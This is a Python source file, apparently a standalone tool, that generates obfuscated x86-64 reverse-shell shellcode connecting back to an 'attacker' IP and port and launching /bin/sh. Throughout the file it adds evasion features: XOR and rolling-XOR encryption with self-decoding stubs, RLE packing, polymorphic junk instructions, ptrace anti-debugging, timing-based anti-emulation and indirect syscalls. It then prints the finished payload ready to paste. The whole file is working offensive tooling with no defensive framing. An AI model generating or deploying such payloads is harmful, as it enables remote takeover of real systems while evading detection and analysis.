__version__ = "0.1.0"

__all__ = [
    "generate_payload",
    "xor_encrypt",
    "rolling_xor_encrypt",
    "rle_encode",
    "generate_polymorphic_junk",
    "remove_comments_from_assembly",
    "rle_decoder_stub",
    "rolling_xor_decoder_stub",
    "main",
]

import argparse
import os
import random
import socket
import sys

from pwn import asm, context

context.log_level = "error"
context.arch = "amd64"

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
RESET = "\033[0m"


def remove_comments_from_assembly(assembly_code: str) -> str:
    lines = assembly_code.splitlines()
    cleaned_lines = []
    for line in lines:
        line = line.strip()
        if not line:
            continue
        comment_index = line.find("#")
        if comment_index != -1:
            cleaned_line = line[:comment_index].strip()
            if cleaned_line:
                cleaned_lines.append(cleaned_line)
        else:
            cleaned_lines.append(line)
    return "\n".join(cleaned_lines)


def myasm(expr: str) -> bytes:
    return asm(remove_comments_from_assembly(expr))  # type: ignore[no-any-return]


def xor_encrypt(data: bytes, key: int) -> bytes:
    if not (0 <= key <= 255):
        raise ValueError("XOR key must be a byte value (0-255).")
    return bytes([b ^ key for b in data])


def rolling_xor_encrypt(data: bytes, key: int) -> bytes:
    if not (0 <= key <= 255):
        raise ValueError("Rolling XOR key must be a byte value (0-255).")
    result = bytearray()
    current_key = key
    for b in data:
        encrypted_byte = b ^ current_key
        result.append(encrypted_byte)
        current_key = (current_key + 1) % 256
    return bytes(result)


def rolling_xor_decoder_stub(original_size: int, start_key: int) -> bytes:
    decoder_asm = f"""
    mov rdi, rsp
    add rdi, 32
    mov rsi, rdi
    mov al, {start_key}

decode_rolling_xor:
    lodsb
    xor al, [rsi-1]
    stosb
    inc al
    cmp al, 0
    jne skip_wrap
    mov al, 0
skip_wrap:
    mov rax, rsp
    add rax, {32 + original_size}
    cmp rdi, rax
    jl decode_rolling_xor

    mov rax, rsp
    add rax, 32
    jmp rax
    """
    try:
        decoder_bytes = myasm(decoder_asm)
        while len(decoder_bytes) < 32:
            decoder_bytes += b"\x90"
        return decoder_bytes
    except Exception as e:
        print(
            f"{RED}[-] Error assembling rolling XOR decoder stub: {e}{RESET}",
            file=sys.stderr,
        )
        print(
            f"{RED}--- Failed Rolling XOR Decoder ASM --- \n{decoder_asm}\n--- END ---{RESET}",
            file=sys.stderr,
        )
        raise


def rle_encode(data: bytes) -> bytes:
    result = bytearray()
    i = 0
    while i < len(data):
        count = 1
        while i + count < len(data) and data[i] == data[i + count] and count < 255:
            count += 1
        result += bytes([count, data[i]])
        i += count
    return bytes(result)


def generate_polymorphic_junk() -> bytes:
    patterns = [
        "xor rcx, rcx",
        "add rdx, 0",
        "lea rsi, [rsi + 0]",
        "mov r9, r9",
        "push rbx; pop rbx",
        "nop",
        "xchg rax, rax",
        "test r8, r8",
        "cdqe",
    ]
    junk_asm = ""
    for _ in range(random.randint(3, 7)):
        junk_asm += random.choice(patterns) + "; "
    try:
        return myasm(junk_asm)
    except Exception as e:
        print(f"{RED}[-] Error assembling junk code: {e}{RESET}", file=sys.stderr)
        print(
            f"{RED}--- Failed Junk ASM --- \n{junk_asm}\n--- END ---{RESET}",
            file=sys.stderr,
        )
        raise


def rle_decoder_stub(original_size: int) -> bytes:
    placeholder_decoder = f"""
    mov rdi, rsp
    add rdi, 100
    mov rsi, rdi
    decode_rle_placeholder:
    lodsb; mov cl, al; lodsb; jecxz s_p; .r_p: stosb; loop .r_p; s_p:
    mov rax, rsp; add rax, {100 + original_size}; cmp rdi, rax
    jl decode_rle_placeholder
    mov rax, rsp; add rax, 100; jmp rax
    """
    try:
        stub_size = len(myasm(placeholder_decoder))
    except Exception as e:
        print(
            f"{RED}[-] Error assembling placeholder RLE stub: {e}{RESET}",
            file=sys.stderr,
        )
        raise

    final_decoder_asm = f"""
    mov rdi, rsp
    add rdi, {stub_size}
    mov rsi, rdi

decode_rle_final:
    lodsb
    mov cl, al
    lodsb
    jecxz skip_stosb_final

.repeat_final:
    stosb
    loop .repeat_final

skip_stosb_final:
    mov rax, rsp
    add rax, {stub_size + original_size}
    cmp rdi, rax
    jl decode_rle_final

    mov rax, rsp
    add rax, {stub_size}
    jmp rax
    """
    try:
        final_stub_bytes = myasm(final_decoder_asm)
    except Exception as e:
        print(
            f"{RED}[-] Error assembling final RLE stub: {e}{RESET}",
            file=sys.stderr,
        )
        print(
            f"{RED}--- Final RLE ASM --- \n{final_decoder_asm}\n--- END ---{RESET}",
            file=sys.stderr,
        )
        raise

    new_stub_size = len(final_stub_bytes)
    if abs(new_stub_size - stub_size) > 8:
        print(
            f"{YELLOW}[*] RLE Stub size recalculated: {new_stub_size} bytes. Retrying stub generation...{RESET}",
            file=sys.stderr,
        )
        depth = getattr(rle_decoder_stub, "recursion_depth", 0)
        if depth > 3:
            raise RecursionError("RLE stub size calculation failed to stabilize.")
        setattr(rle_decoder_stub, "recursion_depth", depth + 1)
        result = rle_decoder_stub(original_size)
        delattr(rle_decoder_stub, "recursion_depth")
        return result
    else:
        if hasattr(rle_decoder_stub, "recursion_depth"):
            delattr(rle_decoder_stub, "recursion_depth")

    return final_stub_bytes


def generate_payload(
    ip: str | None,
    port: int | None,
    executable_path: str,
    junk: bool,
    anti_emulation: bool,
    stack_pivot: bool,
    obfuscate_path: bool,
    anti_debug: bool,
    indirect_syscalls: bool,
) -> bytes:
    payload_asm = ""

    pid = os.getpid()
    path_decode_loop_label = f"path_decode_loop_{pid}"
    ptrace_fail_label = f"being_traced_exit_{pid}"
    syscall_gadget_label = f"syscall_gadget_{pid}"
    main_code_end_label = f"main_code_end_{pid}"
    dup_loop_label = f"dup_loop_{pid}"

    path_xor_key = 0x42

    syscall_instruction = (
        f"call {syscall_gadget_label}" if indirect_syscalls else "syscall"
    )

    if stack_pivot:
        payload_asm += "    sub rsp, 0x500 # Stack Pivot\n"

    if anti_debug:
        payload_asm += f"""
        mov rax, 101
        mov rdi, 0
        xor rsi, rsi
        xor rdx, rdx
        {syscall_instruction}
        test rax, rax
        js {ptrace_fail_label}
        """

    if anti_emulation:
        payload_asm += """
        rdtsc
        mov r10, rax
        mov r11, rdx
        nop; nop; nop; nop
        cpuid
        nop; nop; nop; nop
        rdtsc
        sub rax, r10
        sbb rdx, r11
        """

    if ip and port:
        try:
            ip_bytes = socket.inet_aton(ip)
        except OSError:
            raise ValueError(f"Invalid IP address format: {ip}")
        port_bytes = port.to_bytes(2, "big")
        payload_asm += f"""
            mov rax, 41
            mov rdi, 2
            mov rsi, 1
            xor rdx, rdx
            {syscall_instruction}
            mov rdi, rax

            sub rsp, 16
            mov dword ptr [rsp+4], 0x{ip_bytes.hex()}
            mov word ptr [rsp+2], 0x{port_bytes.hex()}
            mov word ptr [rsp], 2
            mov rax, 42
            mov rsi, rsp
            mov rdx, 16
            {syscall_instruction}
            add rsp, 16

            mov rsi, 0
        {dup_loop_label}:
            mov rax, 33
            {syscall_instruction}
            inc rsi
            cmp rsi, 3
            jne {dup_loop_label}
        """

    try:
        exec_bytes = executable_path.encode("utf-8") + b"\x00"
    except UnicodeEncodeError:
        raise ValueError(
            f"Executable path '{executable_path}' contains non-UTF8 characters."
        )
    padding_needed = (8 - (len(exec_bytes) % 8)) % 8
    padded_exec_bytes = exec_bytes + (b"\x00" * padding_needed)
    exec_len = len(padded_exec_bytes)

    if obfuscate_path:
        print(
            f"{YELLOW}[*] Obfuscating execution path '{executable_path}' with XOR key {path_xor_key:#04x}{RESET}",
            file=sys.stderr,
        )
        final_exec_bytes = bytes([b ^ path_xor_key for b in padded_exec_bytes])
    else:
        final_exec_bytes = padded_exec_bytes

    payload_asm += f"\n        # --- Push {'obfuscated ' if obfuscate_path else ''}executable path '{executable_path}\\0' onto stack ({exec_len} bytes padded) ---\n"
    for i in range(exec_len - 8, -8, -8):
        chunk = final_exec_bytes[i : i + 8]
        chunk_int = int.from_bytes(chunk, "little")
        payload_asm += f"        mov rax, {chunk_int:#018x}\n"
        payload_asm += "        push rax\n"

    payload_asm += "        mov rdi, rsp\n"

    if obfuscate_path:
        payload_asm += f"""
        mov rcx, {exec_len}
        mov rbx, rdi
    {path_decode_loop_label}:
        xor byte ptr [rbx], {path_xor_key:#04x}
        inc rbx
        loop {path_decode_loop_label}
        """

    payload_asm += f"""
        mov rax, 59
        xor rsi, rsi
        xor rdx, rdx
        {syscall_instruction}
        """

    payload_asm += f"""
        jmp {main_code_end_label}

    {ptrace_fail_label}:
        mov rax, 60
        mov rdi, 1
        {"syscall" if not indirect_syscalls else f"call {syscall_gadget_label}"}
        syscall

    """

    if indirect_syscalls:
        try:
            syscall_ret_bytes = myasm("syscall; ret")
        except Exception as e:
            print(
                f"{RED}[-] Error assembling syscall gadget: {e}{RESET}", file=sys.stderr
            )
            raise
        payload_asm += f"""
    {syscall_gadget_label}:
        .byte {", ".join(hex(b) for b in syscall_ret_bytes)}


        """

    payload_asm += f"""
    {main_code_end_label}:
        mov rax, 60
        xor rdi, rdi
        {"syscall" if not indirect_syscalls else f"call {syscall_gadget_label}"}
        syscall
    """

    try:
        payload_bytes = myasm(payload_asm)
    except Exception as e:
        print(f"{RED}[-] Error assembling core payload: {e}{RESET}", file=sys.stderr)
        print(
            f"{RED}--- Failed ASM --- \n{payload_asm}\n--- END ---{RESET}",
            file=sys.stderr,
        )
        raise

    if junk:
        print(
            f"{YELLOW}[*] Inserting polymorphic junk code...{RESET}",
            file=sys.stderr,
        )
        junk_bytes = generate_polymorphic_junk()
        payload_bytes = junk_bytes + payload_bytes

    return payload_bytes


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Ultimate Obfuscated Reverse Shell Shellcode Generator",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )

    conn_group = parser.add_argument_group("Connection Arguments")
    conn_group.add_argument("--ip", help="Attacker IP Address")
    conn_group.add_argument("--port", type=int, help="Attacker Listener Port")
    conn_group.add_argument(
        "-e", "--executable", default="/bin/sh", help="Executable path for execve"
    )

    evasion_group = parser.add_argument_group("Obfuscation & Evasion Arguments")
    evasion_group.add_argument(
        "--xor-key",
        type=lambda x: int(x, 0),
        help="Simple XOR key (0-255) for final payload obfuscation",
    )
    evasion_group.add_argument(
        "--rolling-xor-key",
        type=lambda x: int(x, 0),
        help="Apply rolling XOR encryption (key++) with the given starting key (0-255) [Decoder included]",
    )
    evasion_group.add_argument(
        "--rle",
        action="store_true",
        help="Enable RLE encoding (with self-decoder stub)",
    )
    evasion_group.add_argument(
        "--junk", action="store_true", help="Insert polymorphic junk code"
    )
    evasion_group.add_argument(
        "--obfuscate-path",
        action="store_true",
        help="XOR obfuscate the executable path string in memory (self-decoding)",
    )
    evasion_group.add_argument(
        "--indirect-syscalls",
        action="store_true",
        help="Use indirect calls to a 'syscall; ret' gadget",
    )
    evasion_group.add_argument(
        "--anti-emulation",
        action="store_true",
        help="Insert basic anti-emulation tricks (rdtsc, cpuid)",
    )
    evasion_group.add_argument(
        "--anti-debug",
        action="store_true",
        help="Add anti-debugging check (ptrace PTRACE_TRACEME)",
    )
    evasion_group.add_argument(
        "--stack-pivot",
        action="store_true",
        help="Enable simple stack pivot (sub rsp, 0x500)",
    )

    args = parser.parse_args()

    if args.xor_key is not None and args.rolling_xor_key is not None:
        print(
            f"{RED}[-] Error: Cannot use both --xor-key and --rolling-xor-key at the same time.{RESET}",
            file=sys.stderr,
        )
        return 1
    if args.xor_key is not None and not (0 <= args.xor_key <= 255):
        print(
            f"{RED}[-] Error: XOR key must be between 0 and 255.{RESET}",
            file=sys.stderr,
        )
        return 1
    if args.rolling_xor_key is not None and not (0 <= args.rolling_xor_key <= 255):
        print(
            f"{RED}[-] Error: Rolling XOR key must be between 0 and 255.{RESET}",
            file=sys.stderr,
        )
        return 1
    if args.port and (args.port <= 0 or args.port > 65535):
        print(
            f"{RED}[-] Error: Port must be between 1 and 65535.{RESET}",
            file=sys.stderr,
        )
        return 1
    if not args.ip and args.port:
        print(
            f"{RED}[-] Error: Port provided without IP address.{RESET}",
            file=sys.stderr,
        )
        return 1

    try:
        print(f"{YELLOW}[*] Generating core payload...{RESET}", file=sys.stderr)
        core_payload = generate_payload(
            args.ip,
            args.port,
            args.executable,
            args.junk,
            args.anti_emulation,
            args.stack_pivot,
            args.obfuscate_path,
            args.anti_debug,
            args.indirect_syscalls,
        )
        print(
            f"{YELLOW}[*] Core payload size: {len(core_payload)} bytes{RESET}",
            file=sys.stderr,
        )

        final_payload = core_payload
        payload_size_before_rle = len(final_payload)

        if args.rle:
            print(f"{YELLOW}[*] Applying RLE encoding...{RESET}", file=sys.stderr)
            encoded_payload = rle_encode(final_payload)
            print(
                f"{YELLOW}[*] RLE Encoded payload size: {len(encoded_payload)} bytes{RESET}",
                file=sys.stderr,
            )
            decoder_stub = rle_decoder_stub(payload_size_before_rle)
            print(
                f"{YELLOW}[*] RLE Decoder stub size: {len(decoder_stub)} bytes{RESET}",
                file=sys.stderr,
            )
            final_payload = decoder_stub + encoded_payload
            print(
                f"{YELLOW}[*] Total size with RLE stub: {len(final_payload)} bytes{RESET}",
                file=sys.stderr,
            )

        if args.xor_key is not None:
            print(
                f"{YELLOW}[*] Applying simple XOR encryption with key: {args.xor_key:#04x}{RESET}",
                file=sys.stderr,
            )
            final_payload = xor_encrypt(final_payload, args.xor_key)

        if args.rolling_xor_key is not None:
            print(
                f"{YELLOW}[*] Applying rolling XOR encryption with starting key: {args.rolling_xor_key:#04x}{RESET}",
                file=sys.stderr,
            )
            decoder_stub = rolling_xor_decoder_stub(
                len(final_payload), args.rolling_xor_key
            )
            final_payload = decoder_stub + rolling_xor_encrypt(
                final_payload, args.rolling_xor_key
            )
            print(
                f"{YELLOW}[*] Rolling XOR decoder stub size: {len(decoder_stub)} bytes{RESET}",
                file=sys.stderr,
            )
            print(
                f"{YELLOW}[*] Total size with rolling XOR stub: {len(final_payload)} bytes{RESET}",
                file=sys.stderr,
            )

        print(f"\n{GREEN}[+] Final Shellcode ({len(final_payload)} bytes):{RESET}")
        print("".join(f"\\x{b:02x}" for b in final_payload))
        print(f"\n{YELLOW}[*] Example Usage (Python):{RESET}")
        shellcode_example = "".join(f"\\x{b:02x}" for b in final_payload)
        print(f'shellcode = b"{shellcode_example}"')

    except ValueError as e:
        print(f"\n{RED}[-] Error: {e}{RESET}", file=sys.stderr)
        return 1
    except Exception as e:
        print(
            f"\n{RED}[-] An unexpected error occurred during generation: {e}{RESET}",
            file=sys.stderr,
        )
        import traceback

        traceback.print_exc()
        return 1

    return 0
